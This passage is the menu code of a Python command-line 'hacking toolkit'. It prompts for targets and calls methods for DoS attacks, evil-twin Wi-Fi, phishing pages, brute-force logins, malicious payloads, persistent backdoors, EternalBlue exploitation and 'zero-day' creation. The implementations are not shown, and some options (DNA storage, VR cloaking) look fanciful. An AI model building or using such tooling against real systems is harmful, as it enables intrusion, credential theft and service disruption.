            duration = input("Enter duration (seconds) [10]: ").strip() or "10"
            pm.create_dos_attack(target, int(port), int(duration))
        elif choice == '4':
            ssid = input("Enter SSID [FreeWiFi]: ").strip() or "FreeWiFi"
            pm.create_evil_twin(ssid)
        elif choice == '5':
            ssid = input("Enter SSID [FreeWiFi]: ").strip() or "FreeWiFi"
            pm.create_wifi_honeypot(ssid)
        elif choice == '6':
            url = input("Enter target URL: ")
            param = input("Enter parameter to test [id]: ").strip() or "id"
            pm.sql_injection_test(url, param)
        elif choice == '7':
            url = input("Enter login URL: ")
            user = input("Enter username: ")
            wordlist = input("Enter wordlist path: ")
            pm.brute_force_login(url, user, wordlist)
        elif choice == '8':
            template = input("Enter template (facebook/google) [facebook]: ").strip() or "facebook"
            pm.generate_phishing_page(template)
        elif choice == '9':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def security_tools_menu(pm):
    while True:
        print("\n\033[1;33m" + "="*60)
        print("SECURITY TOOLS".center(60))
        print("="*60 + "\033[0m")
        print("1. üõ°Ô∏è Enable Kill Switch")
        print("2. üîì Disable Kill Switch")
        print("3. üïµÔ∏è Rootkit Detection")
        print("4. üîì Hash Cracker")
        print("5. üí£ Create Malware Payload")
        print("6. üì° Metasploit Listener")
        print("7. üîì Decrypt WiFi Handshake")
        print("8. üîê SSH Tunneling")
        print("9. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            pm.enable_kill_switch()
        elif choice == '2':
            pm.disable_kill_switch()
        elif choice == '3':
            pm.detect_rootkits()
        elif choice == '4':
            hash_val = input("Enter hash: ")
            hash_type = input("Enter hash type (md5, sha1, etc): ")
            pm.crack_hash(hash_val, hash_type)
        elif choice == '5':
            lhost = input("Enter your IP: ")
            lport = input("Enter listening port [4444]: ").strip() or "4444"
            pm.create_malicious_payload(lhost=lhost, lport=int(lport))
        elif choice == '6':
            lhost = input("Enter your IP: ")
            lport = input("Enter listening port [4444]: ").strip() or "4444"
            pm.setup_metasploit(lhost, int(lport))
        elif choice == '7':
            cap = input("Enter handshake capture file: ")
            pm.decrypt_wifi_handshake(cap)
        elif choice == '8':
            rhost = input("Enter remote host: ")
            rport = input("Enter remote port: ")
            lport = input("Enter local port [2222]: ").strip() or "2222"
            pm.start_ssh_tunnel(rhost, int(rport), int(lport))
        elif choice == '9':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def privacy_tools_menu(pm):
    while True:
        print("\n\033[1;35m" + "="*60)
        print("PRIVACY TOOLS".center(60))
        print("="*60 + "\033[0m")
        print("1. üîÄ Randomize MAC Address")
        print("2. üñ• Generate Browser Profile")
        print("3. üîí Encrypt File")
        print("4. üñº Steganography Hide")
        print("5. üé≠ Spoof DNS Response")
        print("6. üëª Enable Stealth Mode")
        print("7. üì∂ Bypass Captive Portal")
        print("8. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            pm.randomize_mac_address()
        elif choice == '2':
            pm.generate_browser_profile()
        elif choice == '3':
            file = input("Enter file to encrypt: ")
            pm.encrypt_file(file)
        elif choice == '4':
            image = input("Enter cover image: ")
            secret = input("Enter file to hide: ")
            pm.steganography_hide(image, secret)
        elif choice == '5':
            domain = input("Enter domain to spoof: ")
            ip = input("Enter IP to redirect to: ")
            pm.spoof_dns_response(domain, ip)
        elif choice == '6':
            pm.enable_stealth_mode()
        elif choice == '7':
            pm.bypass_captive_portal()
        elif choice == '8':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def forensics_menu(pm):
    while True:
        print("\n\033[1;36m" + "="*60)
        print("FORENSICS & ANALYSIS".center(60))
        print("="*60 + "\033[0m")
        print("1. üì° Start Packet Capture")
        print("2. üîç Analyze PCAP File")
        print("3. üåê Network Scanner")
        print("4. üß¨ Analyze Malware")
        print("5. üì∂ Detect Wireless Devices")
        print("6. üîì Decrypt Android Backup")
        print("7. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            iface = input("Enter interface [wlan0]: ").strip() or "wlan0"
            pm.start_packet_capture(iface)
        elif choice == '2':
            pcap = input("Enter PCAP file: ")
            pm.analyze_pcap(pcap)
        elif choice == '3':
            target = input("Enter network CIDR [192.168.1.0/24]: ").strip() or "192.168.1.0/24"
            pm.scan_network(target)
        elif choice == '4':
            file = input("Enter file to analyze: ")
            pm.analyze_malware(file)
        elif choice == '5':
            iface = input("Enter interface [wlan0]: ").strip() or "wlan0"
            pm.detect_wireless_devices(iface)
        elif choice == '6':
            backup = input("Enter backup file: ")
            pm.decrypt_android_backup(backup)
        elif choice == '7':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def configuration_menu(pm):
    while True:
        print("\n\033[1;37m" + "="*60)
        print("CONFIGURATION".center(60))
        print("="*60 + "\033[0m")
        print("1. ‚öôÔ∏è Edit Configuration")
        print("2. üíæ Save Configuration")
        print("3. üîß Simulate Network Conditions")
        print("4. üß† Create Persistent Backdoor")
        print("5. ‚ö° Exploit Vulnerability")
        print("6. üîó Blockchain Explorer")
        print("7. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            # Configuration edit menu would go here
            pass
        elif choice == '2':
            pm.save_config()
        elif choice == '3':
            latency = input("Latency [100ms]: ").strip() or "100ms"
            loss = input("Packet loss [0.5%]: ").strip() or "0.5%"
            rate = input("Bandwidth [1mbit]: ").strip() or "1mbit"
            pm.simulate_network_conditions(latency, loss, rate)
        elif choice == '4':
            pm.create_persistent_backdoor()
        elif choice == '5':
            target = input("Enter target IP: ")
            vuln = input("Vulnerability (eternalblue/shellshock) [eternalblue]: ").strip() or "eternalblue"
            pm.exploit_vulnerability(target, vuln)
        elif choice == '6':
            address = input("Enter Bitcoin address: ")
            pm.blockchain_explorer(address)
        elif choice == '7':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

def future_tech_menu(pm):
    while True:
        print("\n\033[1;38;5;208m" + "="*60)
        print("AI & FUTURE TECH".center(60))
        print("="*60 + "\033[0m")
        print("1. ‚õèÔ∏è Mine Cryptocurrency")
        print("2. ü§ñ AI Threat Detection")
        print("3. üîÆ Quantum Encryption")
        print("4. üõ∞Ô∏è Satellite Communication")
        print("5. üß† Neural Network Spoofing")
        print("6. ‚õìÔ∏è Blockchain Proxy")
        print("7. üëì VR Cloaking")
        print("8. üß¨ DNA Data Storage")
        print("9. üéØ Advanced Persistent Threat")
        print("10. üïµÔ∏è Zero-Day Research")
        print("11. üîô Back to main menu")
        
        choice = input("\nüîç Select option: ").strip()
        
        if choice == '1':
            coin = input("Coin (XMR/BTC/ETH) [XMR]: ").strip() or "XMR"
            pm.mine_cryptocurrency(coin)
        elif choice == '2':
            pm.ai_threat_detection()
        elif choice == '3':
            file = input("Enter file to encrypt: ")
            pm.quantum_encryption(file)
        elif choice == '4':
            pm.satellite_communication()
        elif choice == '5':
            pm.neural_network_spoofing()
        elif choice == '6':
            pm.blockchain_proxy()
        elif choice == '7':
            pm.virtual_reality_cloaking()
        elif choice == '8':
            data = input("Enter data to store: ")
            pm.dna_data_storage(data)
        elif choice == '9':
            target = input("Enter target: ")
            pm.create_advanced_persistent_threat(target)
        elif choice == '10':
            target = input("Enter target software: ")
            pm.create_zero_day_exploit(target)
        elif choice == '11':
            break
        else:
            print("‚ö†Ô∏è Invalid selection")

# ===== RUN APPLICATION =====
if __name__ == "__main__":
    main_menu()